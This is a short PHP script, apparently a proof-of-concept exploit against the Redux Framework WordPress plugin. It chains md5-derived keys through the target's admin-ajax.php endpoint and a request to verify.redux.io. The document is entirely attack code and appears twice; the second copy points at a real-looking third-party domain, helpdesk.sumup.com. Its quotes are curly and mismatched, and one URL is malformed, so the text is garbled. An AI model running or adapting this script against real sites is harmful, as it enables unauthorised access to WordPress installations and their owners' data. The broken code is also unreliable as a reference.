<?php
$target = “https://sub.redacted.com";
$key1 = md5(“$target/-redux”);
$key2 = file_get_contents(“$target/wp-admin/admin-ajax.php?action=$key1”);
$key3 = md5($key2. ‘-support’);
$redux_code = file_get_contents(“http://verify.redux.io/?hash=$key3&site=$target/");
echo file_get_contents(“$target/wp-admin/admin-ajax.php?action=$key3&code=$redux_code”);<?php
$target = “https://sub.redacted.com";
$key1 = md5(“$target/-redux”);
$key2 = file_get_contents(“$target/wp-admin/admin-ajax.php?action=$key1”);
$key3 = md5($key2. ‘-support’);
$redux_code = file_get_contents(“http://verify.redux.io/?hash=$key3&site=$target/");
echo file_get_contents(“helpdesk.sumup.com//wp-admin/admin-ajax.php?action=$key3&code=$redux_code”);